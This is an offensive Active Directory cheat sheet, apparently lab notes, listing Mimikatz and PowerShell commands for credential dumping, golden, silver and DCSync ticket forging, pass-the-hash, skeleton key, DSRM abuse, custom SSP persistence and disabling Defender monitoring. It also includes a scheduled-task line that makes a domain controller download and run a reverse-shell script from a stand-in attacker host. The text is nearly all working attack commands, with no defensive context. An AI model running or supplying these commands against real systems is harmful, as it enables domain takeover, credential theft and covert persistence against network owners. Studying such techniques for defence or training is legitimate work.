https://github.com/PowerShellMafia/PowerSploit.git
```powershell
#mimikatz usage
PS C:\Users\Administrator\Desktop\x64> .\mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonPasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Key import

mimikatz # sekurlsa::msv /patch
ERROR kuhl_m_sekurlsa_acquireLSA ; Key import

mimikatz # sekurlsa::logonPasswords /patch
ERROR kuhl_m_sekurlsa_acquireLSA ; Key import

mimikatz # lsadump::lsa /inject /patch

mimikatz # lsadump::lsa /inject /name:krbtgt

mimikatz # kerberos::golden /User:Administrator /domain:test.local /sid:S-1-5-21-2792811091-2429234815-3980700349 /krbtgt:91d0e21af34edc8340c7bc7669f38590 /id:500 /ptt

mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF6275A42F8

mimikatz #

and here run psexec to caccess \\OTHER_COMPUTERS with cmd.exe
```
# Domain Persistence
`Set-MpPreference -DisableRealTimeMonitoring $true`
`Invoke-Mimikatz -DumpCreds`
`Invoke-Mimikatz -DumpCerts`
`Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:. /ntlm:<ntlmhash> /run:powershell.exe"'`
`Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")`
##### Dump hashes remotely attack
`PS> $sess - New-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local`
`PS> Invoke-Command -Session $sess -FilePath C:\Temp\Invoke-Mimikatz.ps1`
`PS> Enter-PSSession -Session $sess`
`dcorp-dc.dollarcorp.moneycorp.local: PS> Invoke-Mimikatz -Command '"sekurlsa::lsa /patch"'` 
#### Golden ticket attack
`. .\Invoke-Mimikatz.ps1`
`Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`
`Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<SID> /krbtgt:<HASH> /id:500 /groups:512 /startoffset:0 /endin:0 /renewmax:10080 /ptt`
`klist`
`ls \\dcorp-dc.dollarcorp.moneycorp.local\C$`

### - DCSync Golden ticket attack
`Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`

#### Silver ticket attack
`Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc`
`Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:<SID> /target:dcorp-dc.dollarcorp.moneycorp.local /service:cifs /rc4:<RC5 HASH> /user:Administrator /ptt"'`
`klist`
`ls \\dcorp-dc.dollarcorp.moneycorp.local\C$`
`schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe 'iex (New-Object Net.WebClient).DownloadString(''http://ATACKER/Script-Like-Reverse-Shell.ps1'')'"`
`schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"`

###### Skeleton key Attack
`Invoke-Mimikatz -Command '"privelege::debug" "misc::skeleton" -ComputerName dcorp-dc.dollarcorp.moneycorp.local'`
`Enter-PSSession -ComputerName dcorp-dc -Credential dcorp\administrator`
_if mimikatz says: Second pattern not found. do this:_ 
```bash
mimikatz # privilege::debug
mimikatz # !+
mimikatz # processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```

###### DSRM 
`Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' ComputerName dccorp-dc`
`Invoke-Mimikatz -Command '"lsadump::lsa /patch"' ComputerName dccorp-dc`
`Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local`
_`New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD`_
_if error_
_`Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2`_
`Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:<NTLM HASH> /run:powershell.exe"'`
`ls \\dcorp-dc\$c`

###### Custom SSP
`$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Securoty Packages'`
`$packages += "mimilib"`
`Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages`
`Invoke-Mimikatz -Command '"misc::memssp"'`


### - Other 
`klist purge` #remove priveleges